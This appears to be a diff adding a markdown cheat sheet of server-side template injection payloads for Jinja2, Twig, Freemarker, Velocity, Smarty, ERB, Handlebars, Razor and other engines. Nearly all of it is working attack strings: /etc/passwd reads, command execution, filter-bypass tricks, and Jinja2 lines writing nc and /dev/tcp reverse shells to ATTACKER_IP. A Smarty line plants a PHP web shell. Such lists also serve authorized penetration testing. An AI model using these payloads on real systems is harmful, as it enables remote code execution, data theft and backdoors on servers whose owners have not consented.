@@ -1,0 +1,230 @@
+# SSTI (Server-Side Template Injection) Payloads
+
+## ========================================
+## DETECTION PAYLOADS
+## ========================================
+
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+${{7*7}}
+#{7*7}
+*{7*7}
+
+## ========================================
+## JINJA2 (Python - Flask)
+## ========================================
+
+# Detection
+{{7*7}}
+{{7*'7'}}
+
+# Read File
+{{''.__class__.__mro__[1].__subclasses__()[396]('/etc/passwd').read()}}
+{{config.items()}}
+
+# RCE
+{{''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evil.sh').write('#!/bin/bash\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f')}}
+{{''.__class__.__mro__[2].__subclasses__()[40]('shell.sh','w').write('#!/bin/bash\n bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1')}}
+{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}
+{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}
+{{joiner.__init__.__globals__.os.popen('ls').read()}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+
+# List Available Classes
+{{''.__class__.__mro__[1].__subclasses__()}}
+
+# Access Config
+{{config}}
+{{self}}
+{{request}}
+
+## ========================================
+## TORNADO (Python)
+## ========================================
+
+# RCE
+{{__import__('os').popen('whoami').read()}}
+{%import os%}{{os.popen('whoami').read()}}
+
+## ========================================
+## TWIG (PHP - Symfony)
+## ========================================
+
+# Detection
+{{7*7}}
+{{7*'7'}}
+{{dump(app)}}
+{{app.request.server.all|join(',')}}
+
+# RCE
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("whoami")}}
+{{_self.env.enableDebug()}}{{_self.env.isDebug()}}
+{{['id']|filter('system')}}
+{{['cat\x20/etc/passwd']|filter('system')}}
+{{['cat','/etc/passwd']|filter('passthru')}}
+{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}
+
+# File Read
+{{'/etc/passwd'|file_excerpt(1,30)}}
+{{app.request.files.get(1).__construct('/etc/passwd','')}}
+{{app.request.files.get(1).openFile.fread(99)}}
+
+## ========================================
+## FREEMARKER (Java)
+## ========================================
+
+# Detection
+${7*7}
+#{7*7}
+[=7*7]
+
+# RCE
+<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("id")}
+<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("cat /etc/passwd")}
+${"freemarker.template.utility.Execute"?new()("id")}
+
+# Create File
+<#assign ex="freemarker.template.utility.ObjectConstructor"?new()>
+${ex("java.io.FileOutputStream","/tmp/shell.sh").close()}
+
+## ========================================
+## VELOCITY (Java)
+## ========================================
+
+# Detection
+#set($x=7*7)$x
+$x
+
+# RCE
+#set($str=$class.inspect("java.lang.String").type)
+#set($chr=$class.inspect("java.lang.Character").type)
+#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
+$ex.waitFor()
+#set($out=$ex.getInputStream())
+#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
+
+# Alternative RCE
+#set($s="")
+#set($stringClass=$s.getClass())
+#set($runtime=$stringClass.forName("java.lang.Runtime").getRuntime())
+#set($process=$runtime.exec("whoami"))
+#set($null=$process.waitFor())
+#set($out=$process.getInputStream())
+#foreach($i in [1..$out.available()])
+$i$s.valueOf($s.toChars($out.read()))
+#end
+
+## ========================================
+## SMARTY (PHP)
+## ========================================
+
+# RCE
+{system('whoami')}
+{system('cat /etc/passwd')}
+{php}echo `id`;{/php}
+{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
+
+## ========================================
+## MAKO (Python)
+## ========================================
+
+# RCE
+${self.module.cache.util.os.system("id")}
+<%import os%>${os.popen('whoami').read()}
+<% import os; x=os.popen('id').read() %>${x}
+
+## ========================================
+## PUG/JADE (NodeJS)
+## ========================================
+
+# RCE
+= 7*7
+#{7*7}
+#{root.process.mainModule.require('child_process').execSync('id').toString()}
+
+## ========================================
+## ERB (Ruby)
+## ========================================
+
+# Detection
+<%= 7*7 %>
+
+# RCE
+<%= system('whoami') %>
+<%= `whoami` %>
+<%= IO.popen('id').readlines() %>
+<%= require 'open3' %><%= Open3.capture2('whoami') %>
+<%= File.open('/etc/passwd').read %>
+
+## ========================================
+## HANDLEBARS (JavaScript)
+## ========================================
+
+# RCE (requires vulnerable helper)
+{{#with "s" as |string|}}
+  {{#with "e"}}
+    {{#with split as |conslist|}}
+      {{this.pop}}
+      {{this.push (lookup string.sub "constructor")}}
+      {{this.pop}}
+      {{#with string.split as |codelist|}}
+        {{this.pop}}
+        {{this.push "return require('child_process').exec('whoami');"}}
+        {{this.pop}}
+        {{#each conslist}}
+          {{#with (string.sub.apply 0 codelist)}}
+            {{this}}
+          {{/with}}
+        {{/each}}
+      {{/with}}
+    {{/with}}
+  {{/with}}
+{{/with}}
+
+## ========================================
+## DOTLIQUID / LIQUID (.NET)
+## ========================================
+
+# Detection
+{{ 7 | times: 7 }}
+
+# RCE (if allowed)
+{% assign command = "whoami" | RunCommand %}{{command}}
+
+## ========================================
+## RAZOR (ASP.NET)
+## ========================================
+
+# Detection
+@(7*7)
+
+# RCE
+@{
+  var proc = System.Diagnostics.Process.Start("cmd.exe", "/c whoami");
+  proc.WaitForExit();
+}
+
+## ========================================
+## ANGULARJS (Client-Side, but useful)
+## ========================================
+
+{{constructor.constructor('alert(1)')()}}
+{{$eval.constructor('alert(1)')()}}
+{{$on.constructor('alert(1)')()}}
+
+## ========================================
+## BYPASS TECHNIQUES
+## ========================================
+
+# Jinja2 Attribute Bypass
+{{request['application']['__globals__']['__builtins__']['__import__']('os').popen('id').read()}}
+{{request.application.__getattribute__('__globals__').__getitem__('__builtins__').__getitem__('__import__')('os').popen('id').read()}}
+
+# Filter Bypass
+{{7*'7'}} # Instead of {{7*7}}
+{{''.class}} # Instead of {{''.__class__}}
+
+# Keyword Blacklist Bypass
+{{request|attr('application')}}
+{{request|attr('\x5f\x5fclass\x5f\x5f')}}
